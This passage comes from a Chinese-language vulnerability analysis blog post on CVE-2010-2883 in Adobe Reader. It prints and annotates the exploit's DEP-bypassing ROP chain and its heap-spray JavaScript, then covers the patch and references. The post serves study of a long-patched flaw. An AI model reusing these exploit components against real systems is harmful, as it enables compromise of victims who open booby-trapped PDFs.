<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">def</span> <span class="title function_">make_js</span>(<span class="params">encoded_payload</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#* stack_data 字符串存放了利用 shellcode 所需的 payload</span></span><br><span class="line">        <span class="comment"># The following executes a ret2lib using icucnv36.dll</span></span><br><span class="line">        <span class="comment"># The effect is to bypass DEP and execute the shellcode in an indirect way</span></span><br><span class="line">        <span class="comment">#* stack_data 内容较长下文再审计，此处用 ... 略过</span></span><br><span class="line">        stack_data = [</span><br><span class="line">            ...</span><br><span class="line">        ].pack(<span class="string">&#x27;V*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        var_unescape  = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">        var_shellcode = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        var_start     = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        var_s         = <span class="number">0x10000</span></span><br><span class="line">        var_c         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">        var_b         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">        var_d         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">        var_3         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">        var_i         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">        var_4         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        payload_buf = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        payload_buf &lt;&lt; stack_data</span><br><span class="line">        <span class="comment">#* 可以发现 shellcode 紧跟在 stack_data 后</span></span><br><span class="line">        payload_buf &lt;&lt; encoded_payload</span><br><span class="line"></span><br><span class="line">        escaped_payload = <span class="title class_">Rex</span><span class="symbol">:</span><span class="symbol">:Text</span>.to_unescape(payload_buf)</span><br><span class="line"></span><br><span class="line">        js = <span class="string">%Q|</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_unescape&#125;</span> = unescape;</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_shellcode&#125;</span> = <span class="subst">#&#123;var_unescape&#125;</span>( &#x27;<span class="subst">#&#123;escaped_payload&#125;</span>&#x27; );</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_c&#125;</span> = <span class="subst">#&#123;var_unescape&#125;</span>( &quot;%&quot; + &quot;u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; + &quot;%u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; );</span></span><br><span class="line"><span class="string">while (<span class="subst">#&#123;var_c&#125;</span>.length + 20 + 8 &lt; <span class="subst">#&#123;var_s&#125;</span>) <span class="subst">#&#123;var_c&#125;</span>+=<span class="subst">#&#123;var_c&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> = <span class="subst">#&#123;var_c&#125;</span>.substring(0, (0x0c0c-0x24)/2);</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> += <span class="subst">#&#123;var_shellcode&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_b&#125;</span> += <span class="subst">#&#123;var_c&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_d&#125;</span> = <span class="subst">#&#123;var_b&#125;</span>.substring(0, <span class="subst">#&#123;var_s&#125;</span>/2);</span></span><br><span class="line"><span class="string">while(<span class="subst">#&#123;var_d&#125;</span>.length &lt; 0x80000) <span class="subst">#&#123;var_d&#125;</span> += <span class="subst">#&#123;var_d&#125;</span>;</span></span><br><span class="line"><span class="string"><span class="subst">#&#123;var_3&#125;</span> = <span class="subst">#&#123;var_d&#125;</span>.substring(0, 0x80000 - (0x1020-0x08) / 2);</span></span><br><span class="line"><span class="string">var <span class="subst">#&#123;var_4&#125;</span> = new Array();</span></span><br><span class="line"><span class="string">for (<span class="subst">#&#123;var_i&#125;</span>=0;<span class="subst">#&#123;var_i&#125;</span>&lt;0x1f0;<span class="subst">#&#123;var_i&#125;</span>++) <span class="subst">#&#123;var_4&#125;</span>[<span class="subst">#&#123;var_i&#125;</span>]=<span class="subst">#&#123;var_3&#125;</span>+&quot;s&quot;;</span></span><br><span class="line"><span class="string">|</span></span><br><span class="line"></span><br><span class="line">        js</span><br><span class="line">    <span class="keyword">end</span></span><br></pre></td></tr></table></figure></div>

<p>make_js 需要接受一段加密后的 shellcode 作为参数，这段 shellcode 将会经过 make_js 函数的处理后被执行。可以发现 exp 在讲 shellcode 存入 payload_buf 前，先向 payload_buf 中存入了 stack_data 内的 payload，对其进行审计</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line">0x41414141,   # unused 用于补齐堆块内容长度占用的 4B</span><br><span class="line">0x4a8063a5,   # pop ecx / ret</span><br><span class="line">0x4a8a0000,   # becomes ecx</span><br><span class="line"></span><br><span class="line">0x4a802196,   # mov [ecx],eax / ret # save whatever eax starts as</span><br><span class="line"></span><br><span class="line">0x4a801f90,   # pop eax / ret</span><br><span class="line">0x4a84903c,   # becomes eax (import for CreateFileA)</span><br><span class="line"></span><br><span class="line"># -- call CreateFileA</span><br><span class="line">0x4a80b692,   # jmp [eax]</span><br><span class="line"></span><br><span class="line">0x4a801064,   # ret</span><br><span class="line"></span><br><span class="line">0x4a8522c8,   # first arg to CreateFileA (lpFileName / pointer to &quot;iso88591&quot;)</span><br><span class="line">0x10000000,   # second arg  - dwDesiredAccess</span><br><span class="line">0x00000000,   # third arg   - dwShareMode</span><br><span class="line">0x00000000,   # fourth arg  - lpSecurityAttributes</span><br><span class="line">0x00000002,   # fifth arg   - dwCreationDisposition</span><br><span class="line">0x00000102,   # sixth arg   - dwFlagsAndAttributes</span><br><span class="line">0x00000000,   # seventh arg - hTemplateFile</span><br><span class="line"></span><br><span class="line">0x4a8063a5,   # pop ecx / ret</span><br><span class="line">0x4a801064,   # becomes ecx</span><br><span class="line"></span><br><span class="line">0x4a842db2,   # xchg eax,edi / ret</span><br><span class="line"></span><br><span class="line">0x4a802ab1,   # pop ebx / ret</span><br><span class="line">0x00000008,   # becomes ebx - offset to modify</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># This points at a neat-o block of code that ... TBD</span><br><span class="line">#</span><br><span class="line">#   and [esp+ebx*2],edi</span><br><span class="line">#   jne check_slash</span><br><span class="line"># ret_one:</span><br><span class="line">#   mov al,1</span><br><span class="line">#   ret</span><br><span class="line"># check_slash:</span><br><span class="line">#   cmp al,0x2f</span><br><span class="line">#   je ret_one</span><br><span class="line">#   cmp al,0x41</span><br><span class="line">#   jl check_lower</span><br><span class="line">#   cmp al,0x5a</span><br><span class="line">#   jle check_ptr</span><br><span class="line"># check_lower:</span><br><span class="line">#   cmp al,0x61</span><br><span class="line">#   jl ret_zero</span><br><span class="line">#   cmp al,0x7a</span><br><span class="line">#   jg ret_zero</span><br><span class="line">#   cmp [ecx+1],0x3a</span><br><span class="line">#   je ret_one</span><br><span class="line"># ret_zero:</span><br><span class="line">#   xor al,al</span><br><span class="line">#   ret</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">0x4a80a8a6,   # execute fun block</span><br><span class="line"></span><br><span class="line">0x4a801f90,   # pop eax / ret</span><br><span class="line">0x4a849038,   # becomes eax (import for CreateFileMappingA)</span><br><span class="line"></span><br><span class="line"># -- call CreateFileMappingA</span><br><span class="line">0x4a80b692,   # jmp [eax]</span><br><span class="line"></span><br><span class="line">0x4a801064,   # ret</span><br><span class="line"></span><br><span class="line">0xffffffff,   # arguments to CreateFileMappingA, hFile</span><br><span class="line">0x00000000,   # lpAttributes</span><br><span class="line">0x00000040,   # flProtect</span><br><span class="line">0x00000000,   # dwMaximumSizeHigh</span><br><span class="line">0x00010000,   # dwMaximumSizeLow</span><br><span class="line">0x00000000,   # lpName</span><br><span class="line"></span><br><span class="line">0x4a8063a5,   # pop ecx / ret</span><br><span class="line">0x4a801064,   # becomes ecx</span><br><span class="line"></span><br><span class="line">0x4a842db2,   # xchg eax,edi / ret</span><br><span class="line"></span><br><span class="line">0x4a802ab1,   # pop ebx / ret</span><br><span class="line">0x00000008,   # becomes ebx - offset to modify</span><br><span class="line"></span><br><span class="line">0x4a80a8a6,   # execute fun block</span><br><span class="line"></span><br><span class="line">0x4a801f90,   # pop eax / ret</span><br><span class="line">0x4a849030,   # becomes eax (import for MapViewOfFile)</span><br><span class="line"></span><br><span class="line"># -- call MapViewOfFile</span><br><span class="line">0x4a80b692,   # jmp [eax]</span><br><span class="line"></span><br><span class="line">0x4a801064,   # ret</span><br><span class="line"></span><br><span class="line">0xffffffff,   # args to MapViewOfFile - hFileMappingObject</span><br><span class="line">0x00000022,   # dwDesiredAccess</span><br><span class="line">0x00000000,   # dwFileOffsetHigh</span><br><span class="line">0x00000000,   # dwFileOffsetLow</span><br><span class="line">0x00010000,   # dwNumberOfBytesToMap</span><br><span class="line"></span><br><span class="line">0x4a8063a5,   # pop ecx / ret</span><br><span class="line">0x4a8a0004,   # becomes ecx - writable pointer</span><br><span class="line"></span><br><span class="line">0x4a802196,   # mov [ecx],eax / ret - save map base addr</span><br><span class="line"></span><br><span class="line">0x4a8063a5,   # pop ecx / ret</span><br><span class="line">0x4a801064,   # becomes ecx - ptr to ret</span><br><span class="line"></span><br><span class="line">0x4a842db2,   # xchg eax,edi / ret</span><br><span class="line"></span><br><span class="line">0x4a802ab1,   # pop ebx / ret</span><br><span class="line">0x00000030,   # becomes ebx - offset to modify</span><br><span class="line"></span><br><span class="line">0x4a80a8a6,   # execute fun block</span><br><span class="line"></span><br><span class="line">0x4a801f90,   # pop eax / ret</span><br><span class="line">0x4a8a0004,   # becomes eax - saved file mapping ptr</span><br><span class="line"></span><br><span class="line">0x4a80a7d8,   # mov eax,[eax] / ret - load saved mapping ptr</span><br><span class="line"></span><br><span class="line">0x4a8063a5,   # pop ecx / ret</span><br><span class="line">0x4a801064,   # becomes ecx - ptr to ret</span><br><span class="line"></span><br><span class="line">0x4a842db2,   # xchg eax,edi / ret</span><br><span class="line"></span><br><span class="line">0x4a802ab1,   # pop ebx / ret</span><br><span class="line">0x00000020,   # becomes ebx - offset to modify</span><br><span class="line"></span><br><span class="line">0x4a80a8a6,   # execute fun block</span><br><span class="line"></span><br><span class="line">0x4a8063a5,   # pop ecx / ret</span><br><span class="line">0x4a801064,   # becomes ecx - ptr to ret</span><br><span class="line"></span><br><span class="line">0x4a80aedc,   # lea edx,[esp+0xc] / push edx / push eax / push [esp+0xc] / push [0x4a8a093c] / call ecx / add esp, 0x10 / ret</span><br><span class="line"></span><br><span class="line">0x4a801f90,   # pop eax / ret</span><br><span class="line">0x00000034,   # becomes eax</span><br><span class="line"></span><br><span class="line">0x4a80d585,   # add eax,edx / ret</span><br><span class="line"></span><br><span class="line">0x4a8063a5,   # pop ecx / ret</span><br><span class="line">0x4a801064,   # becomes ecx - ptr to ret</span><br><span class="line"></span><br><span class="line">0x4a842db2,   # xchg eax,edi / ret</span><br><span class="line"></span><br><span class="line">0x4a802ab1,   # pop ebx / ret</span><br><span class="line">0x0000000a,   # becomes ebx - offset to modify</span><br><span class="line"></span><br><span class="line">0x4a80a8a6,   # execute fun block</span><br><span class="line"></span><br><span class="line">0x4a801f90,   # pop eax / ret</span><br><span class="line">0x4a849170,   # becomes eax (import for memcpy)</span><br><span class="line"></span><br><span class="line"># -- call memcpy</span><br><span class="line">0x4a80b692,   # jmp [eax]</span><br><span class="line"></span><br><span class="line">0xffffffff,   # this stuff gets overwritten by the block at 0x4a80aedc, becomes ret from memcpy</span><br><span class="line">0xffffffff,   # becomes first arg to memcpy (dst)</span><br><span class="line">0xffffffff,   # becomes second arg to memcpy (src)</span><br><span class="line">0x00001000,   # becomes third arg to memcpy (length)</span><br><span class="line">#0x0000258b,   # ??</span><br><span class="line">#0x4d4d4a8a,   # ??</span><br></pre></td></tr></table></figure></div>

<p>这段 payload 同样包含了一条 ROP 链，且其中的 ROP Gadget 均位于未开启 ASLR 的 icucnv36.dll 库中，其执行内容为调用四个函数，分别是</p>
<ul>
<li>CreateFileA 创建一个文件或设备，payload 创建了一个名为 iso88591 的文件，且该文件可读可写可执行</li>
<li>CreateFileMappingA 创建文件映射内核对象，文件与物理页映射，payload 将创建的文件映射到了物理内存地址</li>
<li>MapViewOfFile 将一个文件映射对象映射到当前应用程序的地址空间。payload 将创建的文件映射到了程序所处的虚拟内存地址空间</li>
<li>memcpy 将源地址的内容复制到目的地址，payload 将 0x1000 字节</li>
</ul>
<p>即通过前三个函数创建一个可读可写的内存段，并将 shellcode 复制到该内存段中，进而绕过 DEP 执行 shellcode。<br>在这之后，exp 创建了一段 JavaScrip 代码，并将上述 payload 及 shellcode 封装到了 JS 代码中，其中</p>
<div class="code-container" data-rel="Ruby"><figure class="iseeu highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload_buf = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload_buf &lt;&lt; stack_data</span><br><span class="line">payload_buf &lt;&lt; encoded_payload</span><br><span class="line">escaped_payload = <span class="title class_">Rex</span><span class="symbol">:</span><span class="symbol">:Text</span>.to_unescape(payload_buf)</span><br><span class="line">var_unescape  = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">var_shellcode = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">var_start     = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">var_s         = <span class="number">0x10000</span></span><br><span class="line">var_c         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">var_b         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">var_d         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">var_3         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">var_i         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br><span class="line">var_4         = rand_text_alpha(rand(<span class="number">100</span>) + <span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>

<p>用于封装 payload 的格式化 JS 代码为</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重命名函数</span></span><br><span class="line"><span class="keyword">var</span> #&#123;var_unescape&#125; = <span class="built_in">unescape</span>;</span><br><span class="line"><span class="comment">// 编码 payload</span></span><br><span class="line"><span class="keyword">var</span> #&#123;var_shellcode&#125; = #&#123;var_unescape&#125;( <span class="string">&#x27;#&#123;escaped_payload&#125;&#x27;</span> );</span><br><span class="line"><span class="keyword">var</span> #&#123;var_c&#125; = #&#123;var_unescape&#125;( <span class="string">&quot;%&quot;</span> + <span class="string">&quot;u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;%u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> );</span><br><span class="line"><span class="comment">// 不断拼接 #&#123;var_c&#125; 确保其足够大</span></span><br><span class="line"><span class="keyword">while</span> (#&#123;var_c&#125;.<span class="property">length</span> + <span class="number">20</span> + <span class="number">8</span> &lt; #&#123;var_s&#125;) #&#123;var_c&#125;+=#&#123;var_c&#125;;</span><br><span class="line">#&#123;var_b&#125; = #&#123;var_c&#125;.<span class="title function_">substring</span>(<span class="number">0</span>, (<span class="number">0x0c0c</span>-<span class="number">0x24</span>)/<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 拼接 shellcode 到  #&#123;var_b&#125; 的末尾</span></span><br><span class="line">#&#123;var_b&#125; += #&#123;var_shellcode&#125;;</span><br><span class="line"><span class="comment">// 拼接 #&#123;var_c&#125; 到  #&#123;var_b&#125; 的末尾</span></span><br><span class="line">#&#123;var_b&#125; += #&#123;var_c&#125;;</span><br><span class="line">#&#123;var_d&#125; = #&#123;var_b&#125;.<span class="title function_">substring</span>(<span class="number">0</span>, #&#123;var_s&#125;/<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 不断拼接 #&#123;var_d&#125; 确保其足够大</span></span><br><span class="line"><span class="keyword">while</span>(#&#123;var_d&#125;.<span class="property">length</span> &lt; <span class="number">0x80000</span>) #&#123;var_d&#125; += #&#123;var_d&#125;;</span><br><span class="line">#&#123;var_3&#125; = #&#123;var_d&#125;.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span>-<span class="number">0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> #&#123;var_4&#125; = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="comment">// Heap Spray</span></span><br><span class="line"><span class="keyword">for</span> (#&#123;var_i&#125;=<span class="number">0</span>;#&#123;var_i&#125;&lt;<span class="number">0x1f0</span>;#&#123;var_i&#125;++) #&#123;var_4&#125;[#&#123;var_i&#125;]=#&#123;var_3&#125;+<span class="string">&quot;s&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<p>填充后的 JS 代码和 TTF 文件一同被封装到木马 PDF 文件中，并被传播给攻击目标</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>Adobe Reader v9.4.0 修复了这个漏洞，其中 CoolType.dll 从 v5.5.72.1 更新到了 v5.5.73.1，区别在于 strcat 函数加入了长度检查，令人感慨</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a class="link"   target="_blank" rel="noopener external nofollow noreferrer" href="https://nvd.nist.gov/vuln/detail/CVE-2010-2883" >NVD - CVE-2010-2883<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener external nofollow noreferrer" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2883" >CVE - CVE-2010-2883<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener external nofollow noreferrer" href="https://book.douban.com/subject/26830238/" >漏洞战争<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener external nofollow noreferrer" href="https://www.adobe.com/support/security/bulletins/apsb10-21.html" >Adobe Official Document<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener external nofollow noreferrer" href="https://mp.weixin.qq.com/s/r778glaQ81tp1_ruF64orw" >没有比我更详细的 CVE-2010-2883 分析了<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener external nofollow noreferrer" href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/minuxs/TrueType%201.0%20Font%20Files.pdf" >TTF Document<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/adobe-type-tools/afdko/blob/develop/c/spot/sfnt_includes/sfnt_SING.h" >SING Table Definition<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener external nofollow noreferrer" href="https://sp4n9x.github.io/2018/06/01/CVE-2010-2883%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" >sp4n9x’s Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   target="_blank" rel="noopener external nofollow noreferrer" href="https://web.archive.org/web/20120303021728/http://www.vupen.com/blog/20100909.Adobe_Acrobat_Reader_0_Day_Exploit_CVE-2010-2883_Technical_Analysis.php" >2010.09.09 - VUPEN - Criminals Are Getting Smarter: Analysis of the Adobe Acrobat&#x2F;Reader 0-Day Exploit<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> CVE-2010-2883 Investigation</li>
        <li><strong>Author:</strong> 7erry</li>
        <li><strong>Created at
                :</strong> 2024-07-07 19:28:31</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2024-07-07 19:28:31
            </li>
        
        <li>
            <strong>Link:</strong> https://7erryx.github.io/2024/07/07/Vulnerability Investigation/CVE-2010-2883-Investigation/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener external nofollow noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2024/07/11/Research%20Note/%E7%A0%94%E7%A9%B6%E7%9A%84%E8%89%BA%E6%9C%AF-%E2%85%A0/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">《研究的艺术》 Ⅰ</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2024/05/10/Tech%20Blog/RE-%E4%BB%8E0%E5%BC%80%E5%A7%8B%E9%98%85%E8%AF%BBFlask%E6%BA%90%E7%A0%81-%E2%85%A3/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">RE:从0开始阅读Flask源码 Ⅳ</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">CVE-2010-2883 Investigation</div>
